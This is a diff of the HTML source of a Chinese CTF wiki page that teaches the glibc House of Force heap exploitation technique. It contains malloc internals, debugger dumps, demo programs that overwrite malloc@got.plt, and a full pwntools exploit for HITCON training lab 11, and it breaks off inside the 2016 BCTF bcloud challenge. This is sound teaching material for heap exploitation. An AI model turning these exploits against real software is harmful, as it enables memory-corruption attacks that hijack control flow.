@@ -22,10 +22,10 @@ av-&gt;top        = remainder;
 
 /* Treat space at ptr + offset as a chunk */
 #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
-</code></pre></div> 之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p> <p><strong>与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下</strong></p> <div class=highlight><pre><span></span><code><span class=n>victim</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span><span class=w></span>
-<span class=n>size</span><span class=w>   </span><span class=o>=</span><span class=w> </span><span class=n>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span><span class=w></span>
-<span class=n>remainder_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>nb</span><span class=p>;</span><span class=w></span>
-<span class=n>set_head</span><span class=p>(</span><span class=n>remainder</span><span class=p>,</span><span class=w> </span><span class=n>remainder_size</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=p>);</span><span class=w></span>
+</code></pre></div> 之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p> <p><strong>与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下</strong></p> <div class=highlight><pre><span></span><code><span class=n>victim</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span>
+<span class=n>size</span><span class=w>   </span><span class=o>=</span><span class=w> </span><span class=n>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span>
+<span class=n>remainder_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>nb</span><span class=p>;</span>
+<span class=n>set_head</span><span class=p>(</span><span class=n>remainder</span><span class=p>,</span><span class=w> </span><span class=n>remainder_size</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=p>);</span>
 </code></pre></div> <p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p> <h2 id=1>简单示例1<a class=headerlink href=#1 title="Permanent link">&para;</a></h2> <p>在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过HOF来篡改 <code>malloc@got.plt</code> 实现劫持程序流程</p> <div class=highlight><pre><span></span><code>int main()
 {
     long *ptr,*ptr2;
@@ -51,23 +51,23 @@ av-&gt;top        = remainder;
 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
 </code></pre></div> 接下来我们执行<code>malloc(-4120);</code>，-4120是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p> <p><div class=highlight><pre><span></span><code>0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt
-</code></pre></div> 所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p> <p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p> <p>0x601010-0x602020=-4112</p> <p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p> <div class=highlight><pre><span></span><code><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>__libc_malloc</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w></span>
+</code></pre></div> 所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p> <p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p> <p>0x601010-0x602020=-4112</p> <p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p> <div class=highlight><pre><span></span><code><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>__libc_malloc</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
 </code></pre></div> <p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p> <div class=highlight><pre><span></span><code><span class=cm>/*</span>
 <span class=cm>   Check if a request is so large that it would wrap around zero when</span>
 <span class=cm>   padded and aligned. To simplify some other code, the bound is made</span>
 <span class=cm>   low enough so that adding MINSIZE will also not wrap around zero.</span>
-<span class=cm> */</span><span class=w></span>
+<span class=cm> */</span>
 
 <span class=cp>#define REQUEST_OUT_OF_RANGE(req)                                              \</span>
 <span class=cp>    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span>
-<span class=cm>/* pad request bytes into a usable size -- internal version */</span><span class=w></span>
+<span class=cm>/* pad request bytes into a usable size -- internal version */</span>
 <span class=c1>//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span>
 <span class=cp>#define request2size(req)                                                      \</span>
 <span class=cp>    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span>
 <span class=cp>         ? MINSIZE                                                             \</span>
 <span class=cp>         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span>
 
-<span class=cm>/*  Same, except also perform argument check */</span><span class=w></span>
+<span class=cm>/*  Same, except also perform argument check */</span>
 
 <span class=cp>#define checked_request2size(req, sz)                                          \</span>
 <span class=cp>    if (REQUEST_OUT_OF_RANGE(req)) {                                           \</span>
@@ -82,8 +82,8 @@ av-&gt;top        = remainder;
 0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000
 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
-</code></pre></div> 之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p> <p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=n>set_head</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span><span class=w> </span><span class=n>nb</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=w> </span><span class=o>|</span><span class=w></span>
-<span class=w>            </span><span class=p>(</span><span class=n>av</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>&amp;</span><span class=n>main_arena</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>NON_MAIN_ARENA</span><span class=w> </span><span class=o>:</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w></span>
+</code></pre></div> 之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p> <p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=n>set_head</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span><span class=w> </span><span class=n>nb</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PREV_INUSE</span><span class=w> </span><span class=o>|</span>
+<span class=w>            </span><span class=p>(</span><span class=n>av</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>&amp;</span><span class=n>main_arena</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>NON_MAIN_ARENA</span><span class=w> </span><span class=o>:</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
 </code></pre></div> <h2 id=2>简单示例2<a class=headerlink href=#2 title="Permanent link">&para;</a></h2> <p>在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面(低地址)的got表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p> <p><div class=highlight><pre><span></span><code>int main()
 {
     long *ptr,*ptr2;
@@ -124,119 +124,119 @@ av-&gt;top        = remainder;
 
 0x400562 &lt;main+60&gt;        mov    edi, 0x10
 0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;
-</code></pre></div> <h2 id=_3>小总结<a class=headerlink href=#_3 title="Permanent link">&para;</a></h2> <p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。</p> <ul> <li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li> <li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li> <li>第三，分配的次数不能受限制</li> </ul> <p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF 的方法进行利用。</p> <h2 id=hitcon-training-lab-11>HITCON training lab 11<a class=headerlink href=#hitcon-training-lab-11 title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11>题目链接</a></p> <p>这里，我们主要修改其 magic 函数为</p> <h3 id=_4>基本信息<a class=headerlink href=#_4 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜  hitcontraning_lab11 git:<span class=o>(</span>master<span class=o>)</span> file bamboobox     
-bamboobox: ELF <span class=m>64</span>-bit LSB executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=k>for</span> GNU/Linux <span class=m>2</span>.6.32, BuildID<span class=o>[</span>sha1<span class=o>]=</span>595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
-➜  hitcontraning_lab11 git:<span class=o>(</span>master<span class=o>)</span> checksec bamboobox 
-<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox&#39;</span>
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
+</code></pre></div> <h2 id=_3>小总结<a class=headerlink href=#_3 title="Permanent link">&para;</a></h2> <p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。</p> <ul> <li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li> <li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li> <li>第三，分配的次数不能受限制</li> </ul> <p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF 的方法进行利用。</p> <h2 id=hitcon-training-lab-11>HITCON training lab 11<a class=headerlink href=#hitcon-training-lab-11 title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11>题目链接</a></p> <p>这里，我们主要修改其 magic 函数为</p> <h3 id=_4>基本信息<a class=headerlink href=#_4 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>hitcontraning_lab11<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>bamboobox<span class=w>     </span>
+bamboobox:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.32,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>595428ebf89c9bf7b914dd1d2501af50d47bbbe1,<span class=w> </span>not<span class=w> </span>stripped
+➜<span class=w>  </span>hitcontraning_lab11<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>bamboobox<span class=w> </span>
+<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox&#39;</span>
+<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
+<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
+<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
+<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
+<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
 </code></pre></div> <p>该程序是一个 64 位的动态链接程序。</p> <h3 id=_5>基本功能<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <p>需要注意的是，该程序开始时即申请了 0x10 的内存，用来保留<strong>两个函数指针</strong>。</p> <p>该程序大概就是对于盒子里的物品进行添加和删除</p> <ol> <li>展示盒子里的内容，依次盒子里每一个物品的名字。</li> <li>向盒子里添加物品，根据用户输入的大小来为每一个物品申请对应的内存，作为其存储名字的空间。但是需要注意的是，这里读取名字使用的是 <code>read</code> 函数，读取长度的参数是用户输入的 v2，而 read 的第三个参数是无符号整数，如果我们输入负数，就可以读取任意长度。但是我们需要确保该数值满足<code>REQUEST_OUT_OF_RANGE</code> 的约束，所以这里存在<strong>任意长度堆溢出</strong>的漏洞。但即使这样，第一次的时候也比较难以利用，因为初始时候堆的 top chunk 的大小一般是不会很大的。</li> <li>修改物品的名字，根据给定的索引，以及大小，向指定索引的物品中读取指定长度名字。这里长度由用户来读入，也存在<strong>任意长度堆溢出</strong>的漏洞。</li> <li>删除物品，将对应物品的名字的大小置为0，并将对应的 content 置为 NULL。</li> </ol> <p>此外，由于该程序主要是一个演示程序，所以程序中有一个 magic 函数，可以直接读取 flag。</p> <h3 id=_6>利用<a class=headerlink href=#_6 title="Permanent link">&para;</a></h3> <p>由于程序中有个 magic 函数，所以我们的核心目的是覆盖某个指针为 magic 函数的指针。这里，程序在开始的时候申请了一块内存来存储两个函数指针，hello_message用于程序开始时使用，goodbye_message 用于在程序结束时使用，所以我们可以利用覆盖 goodbye_message 来控制程序执行流。具体思路如下</p> <ol> <li>添加物品，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li> <li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li> <li>覆盖 goodbye_message 为magic 函数地址来控制程序执行流</li> </ol> <p><strong>这里需要注意的是，在触发top chunk 转移到指定位置时，所使用的大小应该合适，以便于设置新的 top chunk 大小，从而可以绕过下一次分配top chunk 的检测。</strong></p> <p>exp 如下</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># -*- coding: utf-8 -*-</span>
 
-from pwn import *
+from<span class=w> </span>pwn<span class=w> </span>import<span class=w> </span>*
 
-<span class=nv>r</span> <span class=o>=</span> process<span class=o>(</span><span class=s1>&#39;./bamboobox&#39;</span><span class=o>)</span>
-context.log_level <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
-
-
-def additem<span class=o>(</span>length, name<span class=o>)</span>:
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span><span class=s2>&quot;2&quot;</span><span class=o>)</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>str<span class=o>(</span>length<span class=o>))</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>name<span class=o>)</span>
+<span class=nv>r</span><span class=w> </span><span class=o>=</span><span class=w> </span>process<span class=o>(</span><span class=s1>&#39;./bamboobox&#39;</span><span class=o>)</span>
+context.log_level<span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;debug&#39;</span>
 
 
-def modify<span class=o>(</span>idx, length, name<span class=o>)</span>:
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span><span class=s2>&quot;3&quot;</span><span class=o>)</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>str<span class=o>(</span>idx<span class=o>))</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>str<span class=o>(</span>length<span class=o>))</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>name<span class=o>)</span>
+def<span class=w> </span>additem<span class=o>(</span>length,<span class=w> </span>name<span class=o>)</span>:
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span><span class=s2>&quot;2&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>str<span class=o>(</span>length<span class=o>))</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>name<span class=o>)</span>
 
 
-def remove<span class=o>(</span>idx<span class=o>)</span>:
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span><span class=s2>&quot;4&quot;</span><span class=o>)</span>
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span>str<span class=o>(</span>idx<span class=o>))</span>
+def<span class=w> </span>modify<span class=o>(</span>idx,<span class=w> </span>length,<span class=w> </span>name<span class=o>)</span>:
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span><span class=s2>&quot;3&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>str<span class=o>(</span>idx<span class=o>))</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>str<span class=o>(</span>length<span class=o>))</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>name<span class=o>)</span>
 
 
-def show<span class=o>()</span>:
-    r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
-    r.sendline<span class=o>(</span><span class=s2>&quot;1&quot;</span><span class=o>)</span>
+def<span class=w> </span>remove<span class=o>(</span>idx<span class=o>)</span>:
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span><span class=s2>&quot;4&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span>str<span class=o>(</span>idx<span class=o>))</span>
 
 
-<span class=nv>magic</span> <span class=o>=</span> 0x400d49
+def<span class=w> </span>show<span class=o>()</span>:
+<span class=w>    </span>r.recvuntil<span class=o>(</span><span class=s2>&quot;:&quot;</span><span class=o>)</span>
+<span class=w>    </span>r.sendline<span class=o>(</span><span class=s2>&quot;1&quot;</span><span class=o>)</span>
+
+
+<span class=nv>magic</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x400d49
 <span class=c1># we must alloc enough size, so as to successfully alloc from fake topchunk</span>
-additem<span class=o>(</span>0x30, <span class=s2>&quot;ddaa&quot;</span><span class=o>)</span>  <span class=c1># idx 0</span>
-<span class=nv>payload</span> <span class=o>=</span> 0x30 * <span class=s1>&#39;a&#39;</span>  <span class=c1># idx 0&#39;s content</span>
-<span class=nv>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> * <span class=m>8</span> + p64<span class=o>(</span>0xffffffffffffffff<span class=o>)</span>  <span class=c1># top chunk&#39;s prev_size and size</span>
+additem<span class=o>(</span>0x30,<span class=w> </span><span class=s2>&quot;ddaa&quot;</span><span class=o>)</span><span class=w>  </span><span class=c1># idx 0</span>
+<span class=nv>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x30<span class=w> </span>*<span class=w> </span><span class=s1>&#39;a&#39;</span><span class=w>  </span><span class=c1># idx 0&#39;s content</span>
+<span class=nv>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=w> </span>*<span class=w> </span><span class=m>8</span><span class=w> </span>+<span class=w> </span>p64<span class=o>(</span>0xffffffffffffffff<span class=o>)</span><span class=w>  </span><span class=c1># top chunk&#39;s prev_size and size</span>
 <span class=c1># modify topchunk&#39;s size to -1</span>
-modify<span class=o>(</span><span class=m>0</span>, 0x41, payload<span class=o>)</span>
+modify<span class=o>(</span><span class=m>0</span>,<span class=w> </span>0x41,<span class=w> </span>payload<span class=o>)</span>
 <span class=c1># top chunk&#39;s offset to heap base</span>
-<span class=nv>offset_to_heap_base</span> <span class=o>=</span> -<span class=o>(</span>0x40 + 0x20<span class=o>)</span>
-<span class=nv>malloc_size</span> <span class=o>=</span> offset_to_heap_base - 0x8 - 0xf
+<span class=nv>offset_to_heap_base</span><span class=w> </span><span class=o>=</span><span class=w> </span>-<span class=o>(</span>0x40<span class=w> </span>+<span class=w> </span>0x20<span class=o>)</span>
+<span class=nv>malloc_size</span><span class=w> </span><span class=o>=</span><span class=w> </span>offset_to_heap_base<span class=w> </span>-<span class=w> </span>0x8<span class=w> </span>-<span class=w> </span>0xf
 <span class=c1>#gdb.attach(r)</span>
-additem<span class=o>(</span>malloc_size, <span class=s2>&quot;dada&quot;</span><span class=o>)</span>
-additem<span class=o>(</span>0x10, p64<span class=o>(</span>magic<span class=o>)</span> * <span class=m>2</span><span class=o>)</span>
-print r.recv<span class=o>()</span>
+additem<span class=o>(</span>malloc_size,<span class=w> </span><span class=s2>&quot;dada&quot;</span><span class=o>)</span>
+additem<span class=o>(</span>0x10,<span class=w> </span>p64<span class=o>(</span>magic<span class=o>)</span><span class=w> </span>*<span class=w> </span><span class=m>2</span><span class=o>)</span>
+print<span class=w> </span>r.recv<span class=o>()</span>
 r.interactive<span class=o>()</span>
-</code></pre></div> <p>当然，这一题也可以使用 unlink 的方法来做。</p> <h2 id=2016-bctf-bcloud>2016 BCTF bcloud<a class=headerlink href=#2016-bctf-bcloud title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud>题目链接</a></p> <h3 id=_7>基本信息<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜  2016_bctf_bcloud git:<span class=o>(</span>master<span class=o>)</span> file bcloud   
-bcloud: ELF <span class=m>32</span>-bit LSB executable, Intel <span class=m>80386</span>, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class=k>for</span> GNU/Linux <span class=m>2</span>.6.24, BuildID<span class=o>[</span>sha1<span class=o>]=</span>96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
-➜  2016_bctf_bcloud git:<span class=o>(</span>master<span class=o>)</span> checksec bcloud  
-<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud&#39;</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p> <h3 id=_8>基本功能<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p> <ol> <li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li> <li>展示note，啥功能也没有。。</li> <li>编辑note，根据用户指定的 note 编辑对应的内容。</li> <li>删除note，删除对应note。</li> <li>同步note，标记所有的note已经被同步。</li> </ol> <p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p> <p>初始化名字</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>init_name</span><span class=p>()</span><span class=w></span>
-<span class=p>{</span><span class=w></span>
+</code></pre></div> <p>当然，这一题也可以使用 unlink 的方法来做。</p> <h2 id=2016-bctf-bcloud>2016 BCTF bcloud<a class=headerlink href=#2016-bctf-bcloud title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud>题目链接</a></p> <h3 id=_7>基本信息<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2016_bctf_bcloud<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>bcloud<span class=w>   </span>
+bcloud:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>Intel<span class=w> </span><span class=m>80386</span>,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib/ld-linux.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.24,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>96a3843007b1e982e7fa82fbd2e1f2cc598ee04e,<span class=w> </span>stripped
+➜<span class=w>  </span>2016_bctf_bcloud<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>bcloud<span class=w>  </span>
+<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud&#39;</span>
+<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
+<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
+<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
+<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
+<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
+</code></pre></div> <p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p> <h3 id=_8>基本功能<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p> <ol> <li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li> <li>展示note，啥功能也没有。。</li> <li>编辑note，根据用户指定的 note 编辑对应的内容。</li> <li>删除note，删除对应note。</li> <li>同步note，标记所有的note已经被同步。</li> </ol> <p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p> <p>初始化名字</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>init_name</span><span class=p>()</span>
+<span class=p>{</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+1Ch] [ebp-5Ch]</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>tmp</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+5Ch] [ebp-1Ch]</span>
 <span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+6Ch] [ebp-Ch]</span>
 
-<span class=w>  </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span><span class=w></span>
